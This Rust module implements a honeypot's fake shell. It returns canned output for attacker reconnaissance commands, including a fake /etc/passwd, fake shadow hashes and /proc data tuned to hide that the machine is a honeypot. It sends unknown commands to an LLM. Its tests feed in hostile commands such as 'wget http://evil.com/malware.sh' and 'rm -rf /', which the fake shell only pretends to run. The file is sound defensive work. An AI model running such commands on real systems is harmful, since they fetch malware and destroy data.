//! Deterministic fake shell — responds to common commands instantly without AI.
//! Falls back to None for unknown commands (caller should use LLM).
//!
//! This saves AI tokens and provides instant response for reconnaissance commands
//! that attackers typically run first (whoami, id, uname, ls, cat /etc/passwd, etc.)

use std::collections::HashMap;

/// Fake filesystem contents.
fn fake_fs() -> HashMap<&'static str, &'static str> {
    let mut fs = HashMap::new();

    fs.insert(
        "/etc/passwd",
        "\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
deploy:x:1001:1001::/home/deploy:/bin/bash
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
redis:x:112:116::/var/lib/redis:/usr/sbin/nologin",
    );

    fs.insert(
        "/etc/shadow",
        "\
root:$y$j9T$VQR3M.JKIIHR0cR2P.abc$dKvLz8bkP7h.Q5oZ3X1mN9R2pW4.:19500:0:99999:7:::
ubuntu:$y$j9T$7k2hG.rTpLmN5xWq.xyz$bM3nK9pR7tLmW2xQ5vZ8.:19500:0:99999:7:::
deploy:$y$j9T$Nq8mP.kR3tLx7vWz.abc$fJ5nQ2mR9pLkW4xT8vB3.:19500:0:99999:7:::",
    );

    fs.insert("/etc/hostname", "web-prod-01");

    fs.insert(
        "/etc/os-release",
        "\
PRETTY_NAME=\"Ubuntu 22.04.3 LTS\"
NAME=\"Ubuntu\"
VERSION_ID=\"22.04\"
VERSION=\"22.04.3 LTS (Jammy Jellyfish)\"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian",
    );

    fs.insert(
        "/etc/hosts",
        "\
127.0.0.1 localhost
127.0.1.1 web-prod-01
::1 localhost ip6-localhost ip6-loopback",
    );

    fs.insert(
        "/etc/crontab",
        "\
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )",
    );

    fs.insert(
        "/root/.bash_history",
        "\
apt update
apt upgrade -y
systemctl restart nginx
tail -f /var/log/auth.log
ufw status
docker ps
mysql -u root -p
vim /etc/nginx/nginx.conf
certbot renew
df -h",
    );

    // /proc — attackers check these to detect honeypots/containers
    fs.insert("/proc/version", "Linux version 5.15.0-91-generic (buildd@lcy02-amd64-045) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023");

    fs.insert("/proc/cpuinfo", "\
processor\t: 0
vendor_id\t: GenuineIntel
cpu family\t: 6
model\t\t: 85
model name\t: Intel(R) Xeon(R) Platinum 8175M CPU @ 2.50GHz
stepping\t: 4
microcode\t: 0x2007006
cpu MHz\t\t: 2499.998
cache size\t: 33792 KB
physical id\t: 0
siblings\t: 2
core id\t\t: 0
cpu cores\t: 2
bogomips\t: 4999.99
flags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon rep_good nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor
\n\
processor\t: 1
vendor_id\t: GenuineIntel
cpu family\t: 6
model\t\t: 85
model name\t: Intel(R) Xeon(R) Platinum 8175M CPU @ 2.50GHz
cpu MHz\t\t: 2499.998
cache size\t: 33792 KB
cpu cores\t: 2
bogomips\t: 4999.99");

    fs.insert(
        "/proc/meminfo",
        "\
MemTotal:        4031140 kB
MemFree:          521340 kB
MemAvailable:    2512340 kB
Buffers:          184320 kB
Cached:          1825600 kB
SwapCached:            0 kB
Active:          1645200 kB
Inactive:        1180400 kB
SwapTotal:       2097148 kB
SwapFree:        2097148 kB",
    );

    fs.insert(
        "/proc/self/status",
        "\
Name:\tbash
Umask:\t0022
State:\tS (sleeping)
Tgid:\t3456
Pid:\t3456
PPid:\t936
TracerPid:\t0
Uid:\t0\t0\t0\t0
Gid:\t0\t0\t0\t0
VmPeak:\t   12340 kB
VmSize:\t   10072 kB
VmRSS:\t    3600 kB
Threads:\t1",
    );

    fs.insert("/proc/self/cgroup", "0::/");

    fs.insert("/proc/1/cmdline", "/sbin/init");

    fs.insert(
        "/proc/mounts",
        "\
sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
udev /dev devtmpfs rw,nosuid,relatime,size=2015568k,nr_inodes=503892,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000 0 0
tmpfs /run tmpfs rw,nosuid,nodev,noexec,relatime,size=403116k,mode=755 0 0
/dev/sda1 / ext4 rw,relatime 0 0
tmpfs /dev/shm tmpfs rw,nosuid,nodev 0 0",
    );

    fs.insert("/proc/uptime", "4078800.42 7891234.56");

    fs.insert("/proc/loadavg", "0.12 0.08 0.03 1/142 3489");

    // /sys — hardware info attackers check
    fs.insert(
        "/sys/class/dmi/id/product_name",
        "Standard PC (i440FX + PIIX, 1996)",
    );
    fs.insert("/sys/class/dmi/id/sys_vendor", "QEMU");
    // Note: real servers show Dell/HP/Supermicro. Showing QEMU is intentional —
    // attackers who detect VM may think it's a cloud instance, not a honeypot.

    fs.insert("/sys/class/net/eth0/address", "02:00:17:a4:b3:c2");
    fs.insert("/sys/class/net/eth0/operstate", "up");
    fs.insert("/sys/class/net/eth0/speed", "10000");

    fs.insert(
        "/etc/ssh/sshd_config",
        "\
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PubkeyAuthentication yes
MaxAuthTries 6
AuthorizedKeysFile .ssh/authorized_keys",
    );

    fs
}

/// Try to handle a command deterministically. Returns None if unknown (fall back to LLM).
pub fn try_handle(cmd: &str, user: &str, hostname: &str) -> Option<String> {
    let cmd = cmd.trim();
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    let bin = parts.first().copied().unwrap_or("");

    match bin {
        "whoami" => Some(user.to_string()),

        "id" => {
            let uid = if user == "root" { 0 } else { 1000 };
            let gid = uid;
            Some(format!("uid={uid}({user}) gid={gid}({user}) groups={gid}({user})"))
        }

        "hostname" => Some(hostname.to_string()),

        "uname" => {
            let flag = parts.get(1).copied().unwrap_or("");
            match flag {
                "-a" => Some(format!("Linux {hostname} 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux")),
                "-r" => Some("5.15.0-91-generic".to_string()),
                "-n" => Some(hostname.to_string()),
                _ => Some("Linux".to_string()),
            }
        }

        "pwd" => Some(if user == "root" { "/root".to_string() } else { format!("/home/{user}") }),

        "uptime" => Some(" 14:32:07 up 47 days,  3:18,  1 user,  load average: 0.12, 0.08, 0.03".to_string()),

        "w" => Some(format!(
            " 14:32:07 up 47 days,  3:18,  1 user,  load average: 0.12, 0.08, 0.03\n\
             USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n\
             {user}    pts/0    -                14:30    0.00s  0.02s  0.00s w"
        )),

        "cat" | "head" | "tail" | "less" | "more" => {
            let path = parts.get(1).copied().unwrap_or("");
            let fs = fake_fs();
            if let Some(content) = fs.get(path) {
                Some(content.to_string())
            } else if path.is_empty() {
                None // let LLM handle
            } else {
                Some(format!("cat: {path}: No such file or directory"))
            }
        }

        "ls" => {
            let path = parts.iter().filter(|p| !p.starts_with('-')).nth(1).copied().unwrap_or(".");
            let long = parts.iter().any(|p| p.contains('l'));
            match path {
                "." | "" => {
                    if user == "root" {
                        if long {
                            Some("total 32\ndrwx------ 3 root root 4096 Jan 15 10:23 .\ndrwxr-xr-x 18 root root 4096 Dec 20 08:15 ..\n-rw-r--r-- 1 root root 3106 Oct 15  2023 .bashrc\n-rw-r--r-- 1 root root  161 Jul  9  2019 .profile\ndrwx------ 2 root root 4096 Jan 15 10:23 .ssh\n-rw------- 1 root root  512 Jan 10 14:30 .bash_history".to_string())
                        } else {
                            Some(".bashrc  .profile  .ssh  .bash_history".to_string())
                        }
                    } else {
                        if long {
                            Some(format!("total 16\ndrwxr-xr-x 3 {user} {user} 4096 Jan 15 10:23 .\ndrwxr-xr-x 4 root root 4096 Dec 20 08:15 ..\n-rw-r--r-- 1 {user} {user}  220 Jan  6  2022 .bash_logout\n-rw-r--r-- 1 {user} {user} 3771 Jan  6  2022 .bashrc\n-rw-r--r-- 1 {user} {user}  807 Jan  6  2022 .profile\ndrwx------ 2 {user} {user} 4096 Jan 15 10:23 .ssh"))
                        } else {
                            Some(".bash_logout  .bashrc  .profile  .ssh".to_string())
                        }
                    }
                }
                "/tmp" => Some(if long {
                    "total 8\ndrwxrwxrwt 2 root root 4096 Mar 20 14:00 .\ndrwxr-xr-x 18 root root 4096 Dec 20 08:15 ..\n-rw-r--r-- 1 root root    0 Mar 20 12:00 systemd-private-1a2b3c".to_string()
                } else {
                    "systemd-private-1a2b3c".to_string()
                }),
                "/var/log" => Some(if long {
                    "total 2048\n-rw-r----- 1 syslog adm   142380 Mar 20 14:30 auth.log\n-rw-r----- 1 syslog adm    68420 Mar 20 14:30 syslog\n-rw-r----- 1 syslog adm    32100 Mar 20 00:00 kern.log\n-rw-rw-r-- 1 root   utmp   48768 Mar 20 14:30 wtmp\n-rw-r--r-- 1 root   root   21340 Mar 20 14:30 dpkg.log".to_string()
                } else {
                    "auth.log  dpkg.log  kern.log  syslog  wtmp".to_string()
                }),
                "/etc" => Some(if long {
                    "total 380\ndrwxr-xr-x 2 root root 4096 Jan 15 10:00 cron.d\n-rw-r--r-- 1 root root 2981 Jan 15 10:00 crontab\n-rw-r--r-- 1 root root  223 Jan 15 10:00 hosts\n-rw-r--r-- 1 root root   13 Jan 15 10:00 hostname\n-rw-r--r-- 1 root root  449 Jan 15 10:00 os-release\n-rw-r--r-- 1 root root 1748 Mar 20 14:00 passwd\ndrwxr-xr-x 2 root root 4096 Jan 15 10:00 ssh\n-rw-r----- 1 root shadow  512 Jan 15 10:00 shadow".to_string()
                } else {
                    "cron.d  crontab  hosts  hostname  os-release  passwd  shadow  ssh".to_string()
                }),
                "/proc" => Some("1  buddyinfo  cmdline  cpuinfo  crypto  devices  diskstats  filesystems  interrupts  iomem  ioports  kallsyms  kcore  key-users  keys  kmsg  loadavg  locks  meminfo  misc  modules  mounts  net  pagetypeinfo  partitions  sched_debug  schedstat  self  slabinfo  softirqs  stat  swaps  sys  sysrq-trigger  timer_list  uptime  version  vmstat  zoneinfo".to_string()),
                "/sys" => Some("block  bus  class  dev  devices  firmware  fs  kernel  module  power".to_string()),
                "/sys/class" => Some("block  dmi  gpio  input  leds  mem  misc  net  power_supply  rtc  thermal  tty  vc".to_string()),
                _ => Some(format!("ls: cannot access '{path}': No such file or directory")),
            }
        }

        "ps" => {
            let flag = parts.get(1).copied().unwrap_or("");
            if flag.contains("aux") || flag.contains("ef") {
                Some(format!(
                    "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n\
                     root         1  0.0  0.1 169364 11200 ?        Ss   Feb01   0:12 /sbin/init\n\
                     root       412  0.0  0.0  15432  5120 ?        Ss   Feb01   0:03 /lib/systemd/systemd-journald\n\
                     root       823  0.0  0.1  72300  8960 ?        Ss   Feb01   0:01 /usr/sbin/sshd -D\n\
                     www-data  1205  0.0  0.2 142680 18400 ?        S    Feb01   2:15 nginx: worker process\n\
                     mysql     1342  0.1  2.5 1245780 204800 ?      Ssl  Feb01  48:32 /usr/sbin/mysqld\n\
                     root      2109  0.0  0.0   8536  3200 ?        S    Feb01   0:00 /usr/sbin/cron -f\n\
                     {user}   {pid}  0.0  0.0  10072  3600 pts/0    Ss   14:30   0:00 -bash\n\
                     {user}   {pid2}  0.0  0.0  10616  3200 pts/0    R+   14:32   0:00 ps aux",
                    pid = 3456, pid2 = 3489
                ))
            } else {
                Some(format!(
                    "  PID TTY          TIME CMD\n\
                     {pid} pts/0    00:00:00 bash\n\
                     {pid2} pts/0    00:00:00 ps",
                    pid = 3456, pid2 = 3489
                ))
            }
        }

        "df" => Some(
            "Filesystem     1K-blocks    Used Available Use% Mounted on\n\
             /dev/sda1       41284928 12847616  26300196  33% /\n\
             tmpfs            2015568        0   2015568   0% /dev/shm\n\
             tmpfs             403116     1120    401996   1% /run\n\
             /dev/sda15        106858     6182    100676   6% /boot/efi"
                .to_string(),
        ),

        "free" => Some(
            "              total        used        free      shared  buff/cache   available\n\
             Mem:        4031140     1245680      521340       12480     2264120     2512340\n\
             Swap:       2097148           0     2097148"
                .to_string(),
        ),

        "ifconfig" | "ip" => {
            if bin == "ip" && parts.get(1).copied() != Some("a") && parts.get(1).copied() != Some("addr") {
                return None; // let LLM handle ip route, ip link, etc
            }
            Some(
                "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n\
                 inet 10.0.0.42  netmask 255.255.255.0  broadcast 10.0.0.255\n\
                 inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>\n\
                 ether 02:00:17:a4:b3:c2  txqueuelen 1000  (Ethernet)\n\
                 \n\
                 lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n\
                 inet 127.0.0.1  netmask 255.0.0.0"
                    .to_string(),
            )
        }

        "netstat" | "ss" => Some(
            "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n\
             tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n\
             tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n\
             tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN\n\
             tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN\n\
             tcp        0      0 10.0.0.42:22            185.220.101.1:48322     ESTABLISHED"
                .to_string(),
        ),

        "env" | "printenv" => Some(format!(
            "SHELL=/bin/bash\n\
             USER={user}\n\
             PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\
             HOME={home}\n\
             LANG=en_US.UTF-8\n\
             TERM=xterm-256color\n\
             LOGNAME={user}\n\
             HOSTNAME={hostname}",
            home = if user == "root" { "/root".to_string() } else { format!("/home/{user}") }
        )),

        "curl" | "wget" => {
            // Capture the URL as IOC — pretend it worked
            let url = parts.iter().find(|p| p.starts_with("http")).copied();
            if let Some(url) = url {
                if bin == "wget" {
                    Some(format!(
                        "--2026-03-20 14:32:07--  {url}\n\
                         Resolving {host}... connecting...\n\
                         HTTP request sent, awaiting response... 200 OK\n\
                         Length: 1337 (1.3K) [application/octet-stream]\n\
                         Saving to: '{file}'\n\
                         \n\
                         {file}              100%[===================>]   1.31K  --.-KB/s    in 0s\n\
                         \n\
                         2026-03-20 14:32:07 (42.1 MB/s) - '{file}' saved [1337/1337]",
                        host = url.split('/').nth(2).unwrap_or("host"),
                        file = url.split('/').next_back().unwrap_or("index.html")
                    ))
                } else {
                    // curl — just pretend
                    Some("<!DOCTYPE html><html><body>OK</body></html>".to_string())
                }
            } else {
                None // no URL, let LLM handle
            }
        }

        "chmod" | "chown" | "mkdir" | "touch" | "mv" | "cp" => {
            // Pretend success (no output)
            Some(String::new())
        }

        "rm" => {
            // Pretend success
            Some(String::new())
        }

        "echo" => {
            let rest = cmd.strip_prefix("echo").unwrap_or("").trim();
            Some(rest.replace(['"', '\''], ""))
        }

        "date" => Some("Thu Mar 20 14:32:07 UTC 2026".to_string()),

        "which" => {
            let target = parts.get(1).copied().unwrap_or("");
            match target {
                "python" | "python3" => Some("/usr/bin/python3".to_string()),
                "bash" => Some("/usr/bin/bash".to_string()),
                "curl" => Some("/usr/bin/curl".to_string()),
                "wget" => Some("/usr/bin/wget".to_string()),
                "nmap" => Some("".to_string()), // not installed
                "gcc" => Some("".to_string()),
                _ => Some(format!("/usr/bin/{target}")),
            }
        }

        "docker" => Some(
            "CONTAINER ID   IMAGE          COMMAND                  CREATED        STATUS        PORTS                  NAMES\n\
             a1b2c3d4e5f6   nginx:latest   \"/docker-entrypoint.…\"   2 months ago   Up 47 days    0.0.0.0:80->80/tcp     web\n\
             f6e5d4c3b2a1   mysql:8.0      \"docker-entrypoint.s…\"   2 months ago   Up 47 days    3306/tcp               db"
                .to_string(),
        ),

        "service" | "systemctl" => {
            let action = parts.get(1).copied().unwrap_or("status");
            let svc = parts.get(2).copied().unwrap_or("");
            match action {
                "status" => Some(format!("● {svc}.service - {svc}\n     Active: active (running) since Mon 2026-02-01 11:14:23 UTC; 47 days ago")),
                "start" | "stop" | "restart" | "reload" => Some(String::new()),
                _ => None,
            }
        }

        _ => None, // unknown — fall back to LLM
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn whoami_returns_user() {
        assert_eq!(try_handle("whoami", "root", "host"), Some("root".into()));
        assert_eq!(
            try_handle("whoami", "deploy", "host"),
            Some("deploy".into())
        );
    }

    #[test]
    fn cat_etc_passwd_returns_fake() {
        let out = try_handle("cat /etc/passwd", "root", "host").unwrap();
        assert!(out.contains("root:x:0:0"));
        assert!(out.contains("ubuntu:x:1000"));
    }

    #[test]
    fn ls_returns_listing() {
        let out = try_handle("ls -la", "root", "host").unwrap();
        assert!(out.contains(".bashrc"));
    }

    #[test]
    fn unknown_command_returns_none() {
        assert!(try_handle("some_custom_binary --flag", "root", "host").is_none());
    }

    #[test]
    fn curl_captures_url() {
        let out = try_handle("curl http://evil.com/shell.sh", "root", "host").unwrap();
        assert!(out.contains("OK"));
    }

    #[test]
    fn wget_captures_url() {
        let out = try_handle("wget http://evil.com/malware.sh", "root", "host").unwrap();
        assert!(out.contains("saved"));
        assert!(out.contains("malware.sh"));
    }

    #[test]
    fn rm_pretends_success() {
        assert_eq!(try_handle("rm -rf /", "root", "host"), Some(String::new()));
    }

    #[test]
    fn ps_aux_shows_processes() {
        let out = try_handle("ps aux", "root", "host").unwrap();
        assert!(out.contains("sshd"));
        assert!(out.contains("nginx"));
        assert!(out.contains("mysqld"));
    }

    #[test]
    fn id_returns_uid() {
        let out = try_handle("id", "root", "host").unwrap();
        assert!(out.contains("uid=0(root)"));
    }

    #[test]
    fn cat_proc_cpuinfo() {
        let out = try_handle("cat /proc/cpuinfo", "root", "host").unwrap();
        assert!(out.contains("Intel"));
        assert!(out.contains("cpu MHz"));
    }

    #[test]
    fn cat_proc_meminfo() {
        let out = try_handle("cat /proc/meminfo", "root", "host").unwrap();
        assert!(out.contains("MemTotal"));
        assert!(out.contains("SwapFree"));
    }

    #[test]
    fn cat_proc_version() {
        let out = try_handle("cat /proc/version", "root", "host").unwrap();
        assert!(out.contains("Linux version 5.15"));
    }

    #[test]
    fn ls_proc_returns_listing() {
        let out = try_handle("ls /proc", "root", "host").unwrap();
        assert!(out.contains("cpuinfo"));
        assert!(out.contains("meminfo"));
        assert!(out.contains("version"));
    }

    #[test]
    fn ls_sys_returns_listing() {
        let out = try_handle("ls /sys", "root", "host").unwrap();
        assert!(out.contains("class"));
        assert!(out.contains("devices"));
    }

    #[test]
    fn cat_proc_self_cgroup_not_container() {
        let out = try_handle("cat /proc/self/cgroup", "root", "host").unwrap();
        // Should NOT contain docker/lxc indicators — looks like bare metal
        assert_eq!(out, "0::/");
    }
}
